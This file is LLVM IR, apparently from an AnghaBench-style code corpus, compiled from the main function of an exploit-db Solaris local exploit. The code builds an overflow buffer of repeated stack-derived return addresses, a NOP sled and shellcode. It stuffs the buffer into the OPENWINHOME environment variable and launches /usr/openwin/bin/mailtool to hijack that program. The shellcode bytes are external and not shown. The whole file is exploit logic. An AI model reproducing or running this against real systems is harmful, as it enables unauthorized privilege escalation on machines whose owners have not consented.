; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20885.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20885.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"Archi: %s\0A\00", align 1
@ARCH = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"Can't allocate memory.\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"Using address: 0x%x\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@NOP_SIZE = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@.str.3 = private unnamed_addr constant [13 x i8] c"OPENWINHOME=\00", align 1
@.str.4 = private unnamed_addr constant [40 x i8] c"Now running: /usr/openwin/bin/mailtool\0A\00", align 1
@.str.5 = private unnamed_addr constant [26 x i8] c"/usr/openwin/bin/mailtool\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2 x i8*], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %16, i32* %12, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp sgt i32 %17, 1
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @atoi(i8* %22)
  store i32 %23, i32* %12, align 4
  br label %24

24:                                               ; preds = %19, %2
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 2
  br i1 %26, label %27, label %32

27:                                               ; preds = %24
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30)
  store i32 %31, i32* %11, align 4
  br label %32

32:                                               ; preds = %27, %24
  %33 = load i64, i64* @ARCH, align 8
  %34 = inttoptr i64 %33 to i8*
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i8* %34)
  %36 = load i32, i32* %12, align 4
  %37 = call i8* @malloc(i32 %36)
  store i8* %37, i8** %7, align 8
  %38 = icmp ne i8* %37, null
  br i1 %38, label %42, label %39

39:                                               ; preds = %32
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  %41 = call i32 @exit(i32 0) #3
  unreachable

42:                                               ; preds = %32
  %43 = call i32 (...) @get_sp()
  %44 = load i32, i32* %11, align 4
  %45 = sub nsw i32 %43, %44
  %46 = sext i32 %45 to i64
  store i64 %46, i64* %10, align 8
  %47 = load i64, i64* %10, align 8
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i64 %47)
  %49 = load i8*, i8** %7, align 8
  store i8* %49, i8** %8, align 8
  %50 = load i8*, i8** %8, align 8
  %51 = bitcast i8* %50 to i64*
  store i64* %51, i64** %9, align 8
  store i32 0, i32* %13, align 4
  br label %52

52:                                               ; preds = %60, %42
  %53 = load i32, i32* %13, align 4
  %54 = load i32, i32* %12, align 4
  %55 = icmp slt i32 %53, %54
  br i1 %55, label %56, label %63

56:                                               ; preds = %52
  %57 = load i64, i64* %10, align 8
  %58 = load i64*, i64** %9, align 8
  %59 = getelementptr inbounds i64, i64* %58, i32 1
  store i64* %59, i64** %9, align 8
  store i64 %57, i64* %58, align 8
  br label %60

60:                                               ; preds = %56
  %61 = load i32, i32* %13, align 4
  %62 = add nsw i32 %61, 4
  store i32 %62, i32* %13, align 4
  br label %52

63:                                               ; preds = %52
  %64 = load i8*, i8** %7, align 8
  store i8* %64, i8** %8, align 8
  store i32 0, i32* %13, align 4
  br label %65

65:                                               ; preds = %93, %63
  %66 = load i32, i32* %13, align 4
  %67 = load i32, i32* %12, align 4
  %68 = load i32*, i32** @shellcode, align 8
  %69 = call i32 @strlen(i32* %68)
  %70 = sub nsw i32 %67, %69
  %71 = sdiv i32 %70, 2
  %72 = load i32, i32* @NOP_SIZE, align 4
  %73 = sub nsw i32 %71, %72
  %74 = icmp slt i32 %66, %73
  br i1 %74, label %75, label %97

75:                                               ; preds = %65
  store i32 0, i32* %14, align 4
  br label %76

76:                                               ; preds = %89, %75
  %77 = load i32, i32* %14, align 4
  %78 = load i32, i32* @NOP_SIZE, align 4
  %79 = icmp slt i32 %77, %78
  br i1 %79, label %80, label %92

80:                                               ; preds = %76
  %81 = load i32*, i32** @nop, align 8
  %82 = load i32, i32* %14, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i32, i32* %81, i64 %83
  %85 = load i32, i32* %84, align 4
  %86 = trunc i32 %85 to i8
  %87 = load i8*, i8** %8, align 8
  %88 = getelementptr inbounds i8, i8* %87, i32 1
  store i8* %88, i8** %8, align 8
  store i8 %86, i8* %87, align 1
  br label %89

89:                                               ; preds = %80
  %90 = load i32, i32* %14, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %14, align 4
  br label %76

92:                                               ; preds = %76
  br label %93

93:                                               ; preds = %92
  %94 = load i32, i32* @NOP_SIZE, align 4
  %95 = load i32, i32* %13, align 4
  %96 = add nsw i32 %95, %94
  store i32 %96, i32* %13, align 4
  br label %65

97:                                               ; preds = %65
  store i32 0, i32* %13, align 4
  br label %98

98:                                               ; preds = %112, %97
  %99 = load i32, i32* %13, align 4
  %100 = load i32*, i32** @shellcode, align 8
  %101 = call i32 @strlen(i32* %100)
  %102 = icmp slt i32 %99, %101
  br i1 %102, label %103, label %115

103:                                              ; preds = %98
  %104 = load i32*, i32** @shellcode, align 8
  %105 = load i32, i32* %13, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = trunc i32 %108 to i8
  %110 = load i8*, i8** %8, align 8
  %111 = getelementptr inbounds i8, i8* %110, i32 1
  store i8* %111, i8** %8, align 8
  store i8 %109, i8* %110, align 1
  br label %112

112:                                              ; preds = %103
  %113 = load i32, i32* %13, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %13, align 4
  br label %98

115:                                              ; preds = %98
  %116 = load i8*, i8** %7, align 8
  %117 = load i32, i32* %12, align 4
  %118 = sub nsw i32 %117, 1
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %116, i64 %119
  store i8 0, i8* %120, align 1
  %121 = load i8*, i8** %7, align 8
  %122 = call i32 @memcpy(i8* %121, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0), i32 12)
  %123 = load i8*, i8** %7, align 8
  %124 = call i32 @putenv(i8* %123)
  %125 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.4, i64 0, i64 0))
  %126 = getelementptr inbounds [2 x i8*], [2 x i8*]* %6, i64 0, i64 0
  store i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0), i8** %126, align 16
  %127 = getelementptr inbounds [2 x i8*], [2 x i8*]* %6, i64 0, i64 1
  store i8* null, i8** %127, align 8
  %128 = getelementptr inbounds [2 x i8*], [2 x i8*]* %6, i64 0, i64 0
  %129 = load i8*, i8** %128, align 16
  %130 = getelementptr inbounds [2 x i8*], [2 x i8*]* %6, i64 0, i64 0
  %131 = call i32 @execv(i8* %129, i8** %130)
  %132 = load i32, i32* %3, align 4
  ret i32 %132
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @execv(i8*, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
